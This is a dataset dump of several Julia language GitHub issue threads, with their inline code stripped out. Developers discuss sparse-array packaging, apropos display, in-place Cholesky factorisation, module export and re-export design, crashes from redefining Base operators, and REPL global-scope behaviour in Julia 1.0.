off topic. But where if not here should these discussions happen? I did not say first remove it and then do the package. Of course the order is the other way around.  But you are probably right that doing the package is a little bit more complicated due to the binary dependencies. If these were not there it would be a simple copy of the  directory into a new git repo  @friend  What is OR? Does OR require a package? If yes where would be the issue if an additional package is loaded?    OR = operations research, aka optimization, so JuMP, Convex, MathProgBase, the solver bindings, and to some extent Optim. Yes these require an external package, and it probably wouldn't be the end of the world to add an additional dependency package to the mix, BUT, it needs to be done right. It's not yet clear to me, as things stand right now, if taking sparse matrices out of base wholesale can leave both parts working as well together as they did before moving them.  We all want the same thing here, but I don't find the proposal to block a bugfix in favor of a major reorganization as we're trying to finish up 0.4 very convincing. @friend has put his valuable time and effort into developing sparse vectors, and we all have better things to spend our time on than dealing with the fallout of removing everything sparse from Base.  Reading this thread in retrospect taking into account Virals change in the milestone hopefully shows that it could be a good move to decouple the sparse array development from Julia...  @friend there's still no particularly clean way of both fixing the indexing inconsistency bug with SparseVectors as a package while also avoiding massive package breakage or name conflicts by trying to move sparse matrices wholesale into packages. If you would like to start doing the work to prepare package migrations for some of the functionality that's in base right now, please go ahead and start helping do some of that work.  I request not bringing off-topic discussions into issues. I also do not see how this conclusion is drawn - but this is a discussion to be had elsewhere. If you do wish to continue this discussion, I suggest the mailing list or an appropriate issue.  Can this be closed in light of ",99,28,688,0,0,540,23,
JuliaLang/julia/12989,0.049460256499999994,JuliaLang,julia,Improve apropos display,4316,36,22,0,0,"Currently, apropos' output is quite simple — it's just the objects whose docstrings match the search text It might be nice to make this display a bit richer. We could additionally print out the first non-code documentation line to the edge of the screen, e.g., It also might be nice to make it return a Julia type that simply contains an array of objects and their documentation, so IJulia and other non-REPL programs can format it a little nicer or linkify the text for full documentation.  This does have the downside of making the display non-incremental, making it feel a little slower, but it may be worth it. The implementation is also quite simple and should be fairly simple to extend.  I'd like to take this up. Some questions/remarks Currently, in 0.3, apropos(""pearson"") prints this while in 0.4, apropos seems to have been removed entirely. What are the most important functions and files I will need to read / modify, and which branch should I work in?  @friend you'll have to update.  was very recently reintroduced.  @friend Oh, I was on a 7 days old master. Updating now - thanks!  I agree that enriching the  by providing a good indication as to what the found objects are/do is desirable.  However, after studying and playing with Docs.jl and company, I'm concerned that addressing this issue might be easier said than done, possibly leading to confusing or misleading results The Good  and the new Documentation facilities strike me as extremely well designed, providing a solid foundation for development.   nicely sifts through (loaded) module's  information for matches to its target.  It has available both the keys (objects) and values (object documentation) of these matches but, currently ""merely"" prints the keys.  So the information needed to implement this improvement is right where it needs to be, which seems pretty good. The Complicated  There is almost an embarrassment of riches in the object documentation available to  (but currently unused).  It is difficult to know how to consistently extract an appropriate summary from the available information. Looking at the object documentation for  and  in , @friend 's suggestion is quite reasonable.  Just dig through the object documentation,  select the right Markdown structure and (if needed) truncate it for brevity. However the situation may be different in the future.  Looking at a recent version of Master So it looks as if the documentation for objects (generic functions in particular) may be getting rewritten to better fit with the new documentation system, with an emphasis on providing information on how to use representative methods of generic functions rather than on providing generic documentation of the function.  A naive implementation of the improvement to apropos might look good in the current release but show, rather unhelpfully, in a recent Master I suppose that one approach would be to look through the object documentation to print the text in the vicinity of (one of) the matches to the  search target. Any suggestions on how to proceed?  Do we need to rethink this improvement in the light of how Julia object documentation appears to be developing?  Does it make sense to leave  be (it is simple, robust and effective) and consider developing a different tool for more in-depth exploration and presentation of Julia objects?  A feature rich apropos-like tool that (optionally) works across all installed/registered modules could be quite cool, but that might be best developed as a module.  Since my last comment, I've learned a bit more about the structure of object documentation and now feel that enhancing  will be easier than I had thought.  This change of attitude comes with the realization that generic function documentation is ordered in a reasonable way, making it easy to identify the most generic definition of a function.  (Confusingly to me, the doc macro presents function definitions from more specific to less, which is what made my examination of the  documentation disheartening.) So I know how to easily retrieve the most generic definition of a function.  What's the hold-up to solving this issue and having a cooler  command?  It's truncating this definition, which is typically Markdown, for presentation.  I don't yet know how to do that.  Does anyone have any suggestions? ",18,1,121,0,0,63,7,
JuliaLang/julia/1374,0.0216956195,JuliaLang,julia,chold! doesn't act as expected,9120,129,58,0,0,"As I understand it,  is supposed to return an in-place  it outputs such a type, but its value stays as . Also, only the upper diagonal elements are changed, the lower diagonal elements are those of the original matrix.  It's not possible to change the type of something in-place, so the behavior expecting isn't actually feasible. Perhaps this is an indication that  simply shouldn't exist since its behavior can't be made to match that of its non-in-place counterpart.  cc @friend  ""its value stays as an array"" CholeskyDense is a composite of two objects, and Array and a Bool. In that output, you're seeing those two components (note the ""true"" at the end). What's possibly confusing is that that CholeskyDense is designed to act as a decomposition of A, in other words be interchangeable for A when used in linear algebra. For example In other words, this test shows that it's working as intended. If you want the Cholesky factor, used factors(C). Or just call chol(C).  Ah, clever. So the  version basically uses the input array as a computational scratchpad but returns the decomposition still.  I get the decomposition thing---that's really quite useful---I guess I just expected  to have the same result as .  I see your point, and it's a good one. (It took me a little to understand that was probably your thinking, sorry about that.) But as Stefan said, it's not possible. I guess ! also means ""caution!"" in this context -). ! is actually pretty ambiguous some functions have ""dummy"" inputs that really serve as outputs, for others (like sort!) they are genuine inputs and the output is returned in them, and yet others just use their inputs as scratch space. I have wondered about using chold!! on occasion, but in the end any naming convention will break down for functions that have multiple inputs and do different things to them. I just noticed that your comments also point out that chold! is not quite working in place. The call to Lapack is in-place, but then it's calling triu or tril which creates a new matrix. So we have the worst of all worlds, it destroys the input but it also allocates a new matrix, which therefore doesn't really represent a savings. I just pushed a fix for this issue.  So does that mean  won't need to create a new array in memory? If so, that's very handy.  Correct.  Indeed, I should say that C = chold!(A, true) also doesn't create a new array in memory. I would be tempted to rename it. I'm not sure (others could tell you with certainty), but I wonder if having variables change type in the middle of a function is less-than-ideal programming practice from the standpoint of making life easy on the compiler.  It depends. If  is just an identifier, in  you're binding something new to it so it's as if you've really called it  and you call it that for the rest of its scope (which if I understand correctly is conversion to a static single assignment (SSA) representation.) Compilers figure that out. This is different than mutating the value of  into something with a different type, which is what the hypothetical side-effectful  would have to do. As Stefan mentions, that can't be done, since the type of a value can't be changed. Note that I was very careful to completely avoid the word ""variable.""  An alternative would be to use a type to indicate that an object is allowed to be destroyed The exclamation mark could then be reserved for functions that do in-place modifications such as .  That's not a bad idea. I'm a bit used to knowing that ! means I'd better read the documentation on a function, so I don't think this is essential, but it might mean fewer trips to the docs. That certainly has merit. What do others think?  My attitude was much like yours, @friend.  The  in the function name is a sign of danger in that the function can modify its arguments.  That's why almost all the functions in the Blas and Lapack modules have names ending in . To me it is a sign to the casual user that such functions should be avoided.  The expert user who has read the docs can employ such functions to overwrite arrays thereby saving storage and enhancing performance but they should not complain about subtle bugs in their code introduced by the contents of arrays being changed. So I think that the  means, ""you better read the docs carefully before using this function"".  Yes, I think you're right about the  indicating danger, and hence requiring the user to read the documentation. But not all functions that destroy their arguments do (and can) have exclamation marks (Although maybe this example is a bit far-fetched.)  Right. That's a different but related convention, which is that when you give constructors an array, they ""own"" it. Of course, this is to avoid having to make copies of everything, but it can definitely be a usability issue.  As an inner constructor the function  must have the same name as the type so the only way to insert a  in the name is to change the name of the type as well.  Although we expect that it will be very rare to call the inner constructor for a templated class directly, all the other constructors do end up calling the inner constructor eventually.  Thus we are left with the option of mangling the name of the type, potentially confusing some users, or forcing a copy of the argument in the inner constructor.  The latter choice would mean that all such objects would cause a copy of the matrix, which is a situation I would like to avoid.  I would prefer to provide the ability to modify the array in place if the programmer so chooses. All the Factorization types eventually call Lapack subroutines to generate the decomposition.  These subroutines always overwrite some of their arguments, hence the option for overwriting is available.  Saving memory allocation and garbage collection by overwriting is not important when dealing with arrays with tens or hundreds of elements.  It is important when dealing with arrays having tens or hundreds of millions of elements.  I write code that performs iterative optimization of parameters in models that can have matrices of this size in their representation and these arrays need to be updated at each evaluation of the objective function.  I really want to do that updating in place.  In fact, in the R code for these models that I currently have available, I go to a lot of trouble and complication linking compiled code with R code and passing objects that should not be modified but are, exactly to allow for in-place updating.  In early versions of that code (the lme4 package for R) users had the experience of getting models fit and then having R fail because it is unable to allocate memory to construct the object to be returned from the model-fitting function.  In other words, the results were calculated but could not be returned because of a copy operation. They weren't happy.  I think David's point is that you could, if you chose, have the following behavior CholeskyDense{Float64}(A, true) makes a copy of A (so doesn't destroy it). In contrast, CholeskyDense{Float64}(destroy(A), true) does not copy of A, because you've marked A as being something you don't care about preserving, and uses A for its storage of the decomposition. However, I agree with Stefan it's probably a good convention that when you pass things to a constructor, you're passing control of them to the new object. I think I follow that pretty naturally in my coding, but I suppose this is yet another chance to ask whether we need more documentation.  @friend, that's indeed what I meant. The convention of passing control of the arguments in a type constructor to the type does seem to make a lot of sense, however. Adding Destroy methods everywhere would probably be too verbose.  If I have a triangular matrix, is there a way to construct a  instance? As I understand it, the constructor only accepts the full matrix, and then computes the Cholesky decomposition. But what if I already have the Cholesky decomposition computed? This could be useful for sampling from Wishart (and inverse Wishart) distributions, which can be done via a Bartlett decomposition.  @friend At present the  constructors perform the decomposition.  You could always create a  object of the appropriate size as, say,  then replace the matrix as Actually, now that I think of it there is no need to match the size of the matrix used to create Lapack.potrs!♠ directly if you want to solve systems of the form LL'x=b  @friend Regarding adding Destroy methods everywhere, I think it make much more sense to call  than to try to do a lot of gymnastics within a function to have  work.  @friend Thanks. You can actually call , and then replace it with a larger matrix to save having to compute the Cholesky of the identity. However, perhaps it would be better if the constructor for  didn't compute the Cholesky at all i.e. calls to  would take the triangular matrix as the argument. You could transfer the computation to the  function, or use ? This would have the benefit of being consistent with some of the other  types, such as  and .  Actually, I just realised  isn't a subtype of  why is that? ",39,0,289,0,0,164,16,
JuliaLang/julia/17948,0.1075070675,JuliaLang,julia,Provide a way to make the exported symbols of a package available under qualified names and to not make private symbols available,9537,105,64,0,2,"Currently, when importing libraries in Julia, one cannot selectively import only the exported symbols of a package without bringing those symbols into the global scope.  This is often not wanted, and indeed the equivalent in C++ () is often recommended against.  use  @friend That doesn't do what I want.  Consider these two files in the same directory Test1.jl Test2.jl This outputs 2.  I am looking for something that I can use instead of , such that  the first print expression will succeed (because module  will have been brought into scope) the second print expression will fail (because  has not been exported).  That is, I want  qualified access to the module's public API no access to the module's implementation details.    provides a  macro that does this kind of thing  There was some recent discussion about how the state of issues around modules and namespacing didn't reflect the general interest in improving them. I've reopened this and added a ""modules"" label for such issues.  It would be nice to import two or more modules that share one or more exported symbols and designate which module is to be used when all or some of the symbol[s] are used without a module name prefixed (and then when used, not to have warnings about overwriting the so-dominated symbols generated).  @friend that's a good point, but to me there is a world of difference between qualified and unqualified names. A lot of care absolutely must go into how  by itself is resolved. @friend I don't believe the analogy to  is correct;  does not bring all of its symbols into the global namespace, only the symbol . I can certainly appreciate why people don't want lots of names dumped into their namespace. But by the time you've written , why not just give the value of, well, ? In this case I subscribe to the ""we're all consenting adults here"" attitude. To restrict this, we'd be going to a lot of trouble just to slap you on the wrist and prevent you from accessing something. For example, how would you debug the module, e.g. test  interactively? I'm against complexity that only serves to prevent me from doing things.  The problem is that ""import"" treats exported and non-exported symbols identically.  If I type , I don't know if  is part of the public interface of  or just an implementation detail. On Aug 12, 2016 158 PM, ""Jeff Bezanson"" notifications@friend.com wrote  I agree it is good to know which is which.  will tell you just the exported names in a module. Currently tab completion shows all names, but I think it would be good to have a setting to only tab-complete exported names. Documentation also helps; it would be good for  to show a list of exported names, especially if the package lacks documentation.  I would also like an easy way for this to be enforced at runtime. On Aug 12, 2016 424 PM, ""Jeff Bezanson"" notifications@friend.com wrote  @friend Yes, I agree.  My perspective was forward -- resolving APIs, however they may become done.  It seems there needs to be an active way to assert dominance (in the form of how unqualified names are resolved when there is more than one qualified form available).  Maybe there is another way to express this API is a refinement of the that one.  Maybe there is a better way -- this one I noticed.  @friend That would awesome! My preference is that we should hand-hold users more on the documentation side than on the runtime side. I like that Julia separates nonexported functions from exported ones, but doesn't hide them completely.  It's entirely possible that a post-1.0 version of Julia will add access controls that allow some degree of enforced encapsulation, but preventing people from doing things is not a high priority for 1.0.  I am not particularly interested in mandatory encapsulation.  I am more interested in making it easier to avoid using private functions, without polluting the global namespace. On Aug 18, 2016 935 AM, ""Stefan Karpinski"" notifications@friend.com wrote  I'm confused by your statement – how is that interest not satisfied currently?  Currently, there is no way to get access to the public symbols of a module without either injecting them into your scope or making them appear indistinguishable (as far as the consuming code appears) from symbols that are merely implementation details.  So when you write ,  will get  whether it is public or not.  But if you write , then the only difference between exported and non-exported symbols is that , if exported, is injected into your global scope. I don't need for the abstraction barrier to be airtight.  But I do want it to be obvious when I am using something I probably have no business accessing. Perhaps this can be done by convention have a convention that private symbols are in inner modules whose name starts with an underscore, say. On Aug 18, 2016 442 PM, ""Stefan Karpinski"" notifications@friend.com wrote  While I like the Python convention of prefixing private members of classes and modules with an underscore due to its simplicity it is not very aesthetically pleasing ;-) What is missing is a mechanism that allows one to import a single name but only if it is part of the public interface of the module, e.g. like shown below  I have thought it felt a little backwards that  is more conservative than , since the latter allows extension. (Compared to just  which is less conservative than  due to bringing in the exports.) More behavioral distinction between the two might make it a little more obvious when to use one vs the other.  is also less conservative than  which does not feel right.  One option would be a way to declare some symbols as private.  Getting access to them would require reflection (say On Aug 19, 2016 1032 AM, ""Helge Eichhorn"" notifications@friend.com wrote  I like the idea of restricting  to only import exported symbols.  When it comes to qualified access to members of a module if we ever get  overloading then it could be natural to let  work, but require  with a .  If access restriction is ever being added, would it be out of scope to add a more complex rights management in order to disable the IO part (and maybe others independently) of julia? (in order to make it a fully virtual runtime w/o any reality interaction and thus having a ""save"" environment) Concrete reason would be that i'd really love to be able to ""outsource"" parts of a program that i've written so that a user can manipulate it (crazy example i've written a multiplayer game and want to provide access to some underlying methods in order to change behaviour of some things in a pretty complex way, like manipulating the weather based on ingame events) But i obviously neither want any user to be able to shutdown nor misuse the server (for like running a DOS or sending viruses) I know there a a lot of other ways (depending on the situation/use case) to realize such a game, like writing a DSL, doing a whole AST check for ""invalid"" calls (that would be my solution if i had to solve it right now, similar to Reflection/SecurityManagers in Java) or doing the ""calculations"" clientside and only communicate by keywords (thus simply restricting what is considered senseful on the server) But i'm always happy to be lead to even more creative/prettier/faster or otherwise better solutions. That's just my 2 cents for the restriction idea. As i said, it's not about time but about scope (are there chances that julia will ever support such a use case)  A more thorough capability or access control system is definitely a bigger problem. A library for launching missiles will export its  function since that's the entry point, but that doesn't mean everybody is allowed to launch missiles. This issue is really only about convenience, making it easier to avoid depending on private functions. For those purposes it's ok if there are workarounds like , but for real security the goal is to make it as close to impossible to launch the missiles as you can.  Agreed. For security, you really want a microservices approach with an audited / verified kernel.  o/t, but cloudabi has some really neat ideas with capability based security there  cloudabi is Windows averse It is nice of them to allow others to use their relatively more secure versions of the cloudabi, 'nix zeitgiest apps and these other commonly used packages autoconf, automake, bash, bison, boost, buddy, bzip2, c-runtime, cairo, cairomm, cloudabi-reexec, cloudabi, cloudlibc, cmake, compiler-rt, coreutils, curl, cxx-runtime, diffutils, expat, findutils, flac, flex, freetype, fribidi, gawk, gettext, giflib, glib, gmpUpgr, grep, help2man, icu4c, jasper, jpeg, json-c, lcms2, libarchive, libatomic-ops, libcroco, libcxx, libcxxabi, libebml, libevent, libexif, libffi, libgcrypt, libgpg-error, libid3tag, libksba, libmad, libmatroska, libmngRena, libogg, libpng, libressl, libsamplerate, libsigcxx, libsndfile, libsodium, libtasn1, libtheora, libtomcrypt, libtomfloat, libtommath, libtompoly, libtool, libunwind, libvorbis, libwebp, libxml2, libxslt, libxspf, llvm, lua, lz4, lzo, m4, make, memcached, mpfr, nettle, ninja, nspr, openjpeg, opus, pcre, pcre2, picosat, pixman, pkgconf, python, qpdf, re2, sed, snappy, speex, speexdsp, taglib, texinfo, tiff, tomsfastmath, uriparser, x265, xz, yaml, zlib  In Common Lisp,  can only access exported symbols, while  is for all symbols. It worked well. Too bad  already has a meaning.  could be reclaimed. There's also  which is already deprecated in 0.6 and will be fully available in 1.0.  As far as I can tell, this is a dup of  Yes, looks very much like a dup. ",36,77,369,0,0,151,5,
JuliaLang/julia/1986,0.334216535,JuliaLang,julia,Re-exporting one module's symbols from another,10954,165,64,0,1,"It would be convenient if there were a way to do this. Doing this explicitly (copy the long list of exports from A into B) is a bit ugly and error prone. I imagine any alternative would involve a new keyword though. Concretely, Gadfly is useless without symbols from Compose (and probably DataFrames), but a bunch of compulsory using statements isn't great.  Actually, I would propose altering export's semantics to make this work  This is a very good point. I've taken to doing  at the start of any new package code that has DataFrames as a requirement.  My suggestion would be , which would re-export the exported names of  (but not the unexported names!).  A potential downside is that it may make discovery of exported names a bit harder. Also, I'm disinclined to support reserving another name . So, alternatively, something like  perhaps? Or  (a module name followed by a period)?  seems weird to me (and if you are willing to add a  keyword, why not ?), but  seems fine to me if a bit subtle. I don't understand your concern about discovery of exported names; could you clarify?  Currently, it easy to parse any julia file, search for  at the start of an expression, and interpret the comma-separated list that follows to quickly identify the public interface for a module. ♠using ... as ... with reexportusing`, not a new keyword  I see, you are worried about manually parsing for exports.  It's not too bad with , though—you just need to do the same thing recursively for each . If you are wedded to , I would tend to just support .  I'm just tossing around other proposals for consideration. Very likely, none of them are inherently better. I didn't mean to imply the  part was required.  or  or  would all be valid. Whether this is a single word or a phrase depends on whether we want to be closer to a english sentence or a keyword. I could accept either.  I personally kind of like .  It's got a nice symmetry with .  I made a macro that mostly works for this pupose. I say mostly because relative module syntax does not work. The parser parses  as  and throws a syntax error on .  If we ever get a resolution of this issue, we would be able to remove hundreds of lines' worth of redundant-seeming exports from Base.LinAlg and then again from Base.  I'm with @friend, in that I find  most appealing. What's the downside to adding that as a keyword?  What does  do if you haven't imported/used anything from A, e.g. Exporting bindings that are not accessible in  is not really an option, so does it throw, export only the  module and none of its exported symbols, or implicitly call  or ? Unless it does something implicitly, it is even more verbose than the alternatives, since you need two lines of code instead of one. And if it does something implicitly, then we are adding a fourth keyword that imports bindings.  Throw an error.  Even though it's more verbose, I find it clearer and more natural than most of the proposed alternatives.  If  is going to throw if the module isn't already imported/used, it may as well be a macro? Since all imported/used modules will be in the module's scope by virtue of , it's not clear to me it needs to support relative module paths, which is the only thing a macro couldn't do.  Whats the advantage of being a macro? It would be totally inconsistent if we have , , ,  Minimalism? It would be one fewer reserved identifier, one fewer Expr head, and in Julia instead of C. It is already a little awkward if it joins  and  as (I think) the third keyword that throws an error if another keyword has not been used before it. I kind of see the symmetry, but it doesn't seem quite right to me You can add bindings from another module to the current module and you can export bindings in the current module from the current module, but you cannot export bindings in another module from the current module unless those bindings are already also present in the current module. Personally, I would still prefer one of the two options I've created PRs for. It seems to me that is less elegant and easier to screw up than But if everyone else wants  and is averse to the  symbol, I can try to make that happen.  Well, minimalism is a point that is always a concern when thinking about adding a keyword. I think the more general question is whether the regular Julia user should be confronted with the usage of macros. I would say no. This is an advanced thing and should not be part of the regular workflow. exportall is from my perspective something that will be needed in the ""regular use"" Its quite common to structure modules (namspaces, ...) into two levels.  @friend Yes, writing a macro might be an advanced thing that ordinary users should not need to worry about. However, I don't think using a macro is that advanced -- they don't even need to understand how a macro works behind the scene in order to use it. All what we need is to clearly document the macro's usage. For instance, @friend is a good example which everyone can easily understand and use. Also, a code author should be quite tech savvy when he is worrying about something like re-exporting names.  @friend macros are great. But still they do ""magical"" code transformations that I think most users should not be confronted with.  is a good example. This is a thing for advanced usage not for regular usage. I think reexporting names will be not that uncommon in practice. The export mechanism is Julias way for information hiding. And having submodules in modules is common and should also be encouraged.  A better example for ""macros all users should be comfortable with"" is .  Which I think should be replaced with a pure Julia implementation when we can. (I have one partially implemented.)  is pure Julia. It's just a macro. While a function could be useful for rare cases where the format string could vary at runtime, I am not sure how a function could be as performant as the macro, since the macro generates code based on the format string at load time. We also have , which is a keyword in most other languages.  Probably  and  are the best examples of macros for which my statement that macros are only for advanced users does not hold.  Comment fail. Need to try again on a different device.  Another approach to this is not to import and then re-export, but rather to make these modules somehow ""inherit"" from the other modules. I.e. something like this In particular, one could consider a ""bare module"" – currently created with the  keyword – to be a module which inherits from no modules. However, you don't want this to be the default since it's handy to  all operators and have all of Base's exports available via . This default behavior could be expressed as this parentless module Then the default module behavior would be this Thus, writing  would be equivalent to the current  and writing  by itself would just be shorthand for .  @friend That proposal seems elegant, but I'm a little worried about the nested module case. I guess you'd have something like To make this work, we'd have to first load all nested modules, then import their bindings, and finally load the main module. I'm not sure how big of a change this would be. I'm also not sure one always wants to inherit unexported bindings from other modules. In the nested module case, there's no reason we'd need the unexported bindings in the main module, and some could conflict.  I didn't really mean for unexported bindings to be inherited. But yes, that is what I said.  Needs some more thought, but I think there's something clean here.  I like Stefans proposal if it plays nice with with submodules.  @friend Any further thoughts? Thinking about this more, I am a little worried about creating another way to import bindings that is subtly different from , , and . This might confuse more than it clarifies.  I recently read a Julia dev paraphrasing someone else, in saying that Julia takes a ""we're all consenting adults here"" attitude. I'd very much like to be able to consent to exporting all symbols (or having a module inherit the exports of a parent, following @friend's implementation idea). If I'm writing library A, I'd like to be able to divide its concerns up into submodules of X and Y. In this way someone who only needed, say, the ""Network"" portion could employ , but most users would be opting for . There isn't any more implicit namespace pollution involved here than in the  call itself; the module inheritence would still only be acting on explicitly defined exports from modules X and Y, but I would no longer need to export every new function added to either submodule twice. (And with further nesting comes further code duplication.) I love the module implementation and its decoupling from the files themselves, it makes structuring a project (and later refactoring) that much easier. But without being able to shuttle around the symbols I'm exporting from submodule to parent, maintaining that clean organization becomes a constant thorn in the side, as you micro-manage your exports from one level to the next. It would be of further use in reducing code duplication when you have a group of conceptually related packages or modules that are always imported together. For a concrete example, there's the OpenGL library. You have the actual API versioned symbols you require, as well as the GLU library, and your own wrappers and convenience functions. For every submodule you write, you're importing three separate modules that will always be imported together in your code, instead of being able to do something like Sorry for the lack of brevity, but I wanted to share some use cases. I'm a new Julia user coming mostly from python, and I've been bitten by this problem multiple times over the last few days.  Has there been any further progress, decision or discussion on this matter? Is @friend 's  package the agreed standard way to re-export the symbols of another package, i.e. should I use it?  Since I haven't seen any other options emerge, I think Reexport is the de facto standard.  Thanks @friend ) I will be relying on it and will keep an eye on this thread.  It would be really great if we could have this functionality in Base. It would be great to have metapackages that simply group several packages together in order to provide a larger set of functionality.  Needs some design thoughts to figure out how we want this to work and interact with  /  /  / etc.  Crossref #14472  I put together a macro implementation of something like this for one of my PRs as a demo  Seems feature-y. There might be syntax we could want, but we if that does happen we can live with  a macro until 2.0.  Re-export is evil.  I disagree that Reexport is evil. In writing a package with many levels of submodules, I find Reexport very convenient for managing namespaces across levels without lots of boilerplate code and code duplication. I echo the sentiment expressed above that this would be great functionality to have in Base. ",67,2,334,0,0,198,13,
JuliaLang/julia/23605,0.0675445885,JuliaLang,julia,"fatal and strange: errors when overwriting Base.<, Base.==, etc. for Int64,Float64,etc. using @eval in v0.6.0",3464,34,22,0,0,"Reproduces 100% of the time for me [fatal] This is also 100% reproducible, but you must type each line after line 2 to get the same output [strange]  Well, if you overwrite critical function incorrectly that's exactly what should happen.  Not sure I agree with your claim that that is what exactly what should happen.  I think you mean ""we don't prevent users from overwriting critical functions; doing so may result in gibberish"". Is that the approach being taken with the language in general?  We tend to be permissive, but speaking in such general terms is not really useful. It would be very simple to make it an error to overwrite methods in , for example. It just hasn't seemed very urgent in practice.  Ok, thanks for clarifying.  Here's another piece of code, this time resulting in a segfault.  Is this also in the camp of ""don't write stupid code""? ♠Set{Array{T}}() where {T&lt;Float64}` [segfault] I guess I'm not that clear on what type of crashes are worth reporting given that the code is not supposed to work.  None of overwrite base function causing crash are worth reporting. All of other segfaults/hard crashes that's not obviously using unsafe features are worth reporting and  does look like it should have a better error.  @friend We always appreciate bug reports and you should always report any possible issue you run into. Different cases are different. Even if two problems have the same underlying cause that is often not obvious at first. In this case, IIUC, the original problem report did not involve a segfault, whereas your new example does. In any case we absolutely do not take the attitude that nothing is supposed to work and so bug reports are futile. That is not a terribly productive inference to make.  Ok, thanks.  I'll keep reporting then and you guys can ignore at your leisure if i report something that's a known philosophical issue.  Let me know if you want me to open a separate issue for the segfault.  Please do.  @friend, there's a notion of ""type piracy"" which not everyone buys into, but if you do not commit type piracy, you are definitely in the clear in the sense of ""your code should not crash Julia"" type piracy is adding a method to a function that doesn't ""belong"" to you for arguments where none of the argument types ""belong"" to you. Or conversely, you are not committing an act of piracy if the function or one of the argument types belongs to you – in other words, you can be certain that what you define cannot conflict with anyone else. In this case, redefining very basic operations like integer comparison is very much type piracy the  operator and the type  belong to Base (i.e. everyone), so changing what  means is going to mess with everything. If you want to define your own  operator which has different behavior, just don't qualify the overload. You can even do so with a fallback to call .  Just to clarify that type piracy is a concept that is related although not a requirement for overwriting low level/ fundamental Base functions. There are other Base functions that you can overwrite for your own types that can cause low level operations involving your type to crash in a bad way. You can get this effect easily with type reflection functions, e.g. There's no type piracy involved here but it's in the same class as overwriting  (i.e. this code ""should"" crash julia). In both cases, Base code assumes certain functions to behave correctly and overwriting them can cause huge trouble. ",18,2,114,0,0,50,2,
JuliaLang/julia/28789,0.067432593,JuliaLang,julia,Global variable scope rules lead to unintuitive behavior at the REPL/notebook,55519,616,331,0,4,"Example 1 This came up with a student who upgraded from 0.6 to 1.0 directly, so never even got a chance to see a deprecation warning, let alone find an explanation for new behavior Example 2 I ""get"" why this happens in the sense that I think I can explain, with sufficient reference to the arcana in the manual about what introduces scopes and what doesn't, but I think that this is problematic for interactive use. In example one, you get a silent failure. In example two, you get an error message that is very there-is-no-spoon. Thats roughly comparable to some Python code I wrote in a notebook at work today. I'm not sure what the rules are in Python, but I do know that generally you can't assign to things at the global scope without invoking global. But at the REPL it does work, presumably because at the REPL the rules are different or the same logic as if they were all are in the scope of function is applied. I can't language-lawyer the rules enough to propose the concrete change I would like, and based on Slack this isn't even necessarily perceived as an issue by some people, so I don't know where to go with this except to flag it.  (Per @friend, this is the relevant change  I vaguely remember some discussion of one possibility to solve this issue being automatic wrapping of REPL entries in  blocks?  But wouldn't that be confusing in that you couldn't do and use  after that? Unless  is inserted for all the toplevel assignments, I guess?  The behavior wouldn't be just to wrap everything in a  block—it's more complicated than that. You need to let-bind any global that's assigned inside the expression and then extract the let-bound value to a global at the end of the expression.  So you would turn  into something like . And something like would be turned into this Frankly, I'm pretty annoyed that people are only giving this feedback now. This has change has been on master for ten months.  I'm guilty of not having followed master very closed until recently, so this feedback is indeed a bit late. More than a concern for programmers (most  loops will be inside a function in library code) I'm afraid this is a concern for teaching. Often  loops are taught before functions or scopes (of course you need to understand scopes to really understand what's going on but in teaching things are often simplified). Here it becomes a bit difficult to teach a beginner how to sum numbers from 1 to 10 without explaining functions or global variables.  To be fair, Julia 0.7 was released 13 days ago. This is a new change for most Julia users.  Unfortunately for those of us who can not handle living on the edge, its brand-new from our perspective.  And for those of us who have been encouraged to stay off the development branches, ""it's brand-new from our perspective.""  Can we please go back to focus on the issue at hand now, instead of having a meta issue discussion about how long people have had to test this. It is what it is right now, so let's look forward.  This is a big point. After finding out what the issue really is, it's surprising how little it actually shows up. It is less of an issue with a lot of Julia code in the wild and in tests, and it did reveal a lot of variables which were accidentally global (in both Julia Base's tests according to the original PR, and I noticed this on most of DiffEq's tests). In most cases it seems that the subtly wrong behavior isn't what you get (expecting a change in a loop), but rather expecting to be able to use a variable in a loop is what I've found to be the vast majority of where this shows up in updating test scripts to v1.0. So the good thing is that in most cases the user is presented with an error, and it's not difficult to fix. The bad thing is that it's a little verbose to have to put  inside of the loops, and now your REPL code is also different from the function code. Whether or not it's more intuitive behavior than before is a tough opinion because there were definitely some edge cases in hard/soft local scoping and so this is clearly easier to explain. But at the same time, while having a much more succinct explanation than the behavior of before, it's now easier to hit the edge cases where understanding scoping rules matters. 🤷‍♂️. I for one would like to see the experiments with  blocking. This would keep the ""you didn't really want so many globals"" aspect of it, along with the simplified scoping explanation, while at the same time make REPL code behave like function interiors (which is seemingly what we've always wanted). Or inversely, making people specify variables they want to act as globals could be a nice way to keep the explicitness, and would make the ""REPL code is slow because of globals"" be much more obvious. The downside is that once again throwing things into a function would not require the  markers. But given how this tends to show up, it's not really gamebreaking or a showstopper. I'd classify it as a wart  that should get a mention in any workshop but it's not like v1.0 is unusable because of it. I hope that changing this behavior isn't classified as breaking and require v2.0 though.  I'm not so sure I like the idea that the REPL should behave like a function interior.  It clearly isn't, so I expect it to behave like global scope.  To me the REPL not behaving like global scope would be potentially even more confusing than the discrepency that causes this issue. Regardless, at the very least I think that the documentation should be somewhat more explicit about this issue.  Casually reading the docs I would have assumed that you would need to use the  keyword to get the behavior occurs in global scope by default.  If we're going for ""REPL is the same as the inside of a function"" we should also think about  versus  People haven't been using master for interactive use or for teaching, they've been using it to upgrade packages, which are only minimally affected by this and are mostly written by experienced programmers. (I was one of the few people who did give feedback in #19324, though, where I argued for the old behavior.) A non-breaking way out of this would be to change back to the old behavior (ideally not by inserting implicit  blocks or anything — just restore the old code in  as an option) in the REPL.  Or rather, to make it available in environments like IJulia that might want it, add a  flag to , , and  to restore the old behavior.  Yes, and I greatly appreciate it. It doesn't much matter now since we made the choice, let it bake for ten months and have now released it with a long-term commitment to stability. So the only thing to do now is to focus on what to do going forward. Having an option to choose between the old behavior and the new one is interesting but it feels very hacky. That means we not only sometimes have a scoping behavior that everyone apparently found incredibly confusing, but we don't always have it and whether we have it or not depends on a global flag. That feels pretty unsatisfactory, I'm afraid.  If someone implements an ""unbreak me"" soft-scope AST transformation, it will be very tempting to use it in IJulia, OhMyREPL, etcetera, at which point you get the even more problematic situation in which the default REPL is seen as broken.  That's not what I'm saying. Clearly we should use the same solution in all those contexts. But implementing it as two different variations on scoping rules seems less clean than implementing it as a code transformation with one set of scoping rules. But perhaps those are functionally equivalent. However, it seems easier to explain in terms of the new simpler scoping rules + a transformation that takes REPL-style input and transforms it before evaluating it.  That could be done as  that transforms an expression by automatically annotating any globals which exist in the module as global if they are assigned 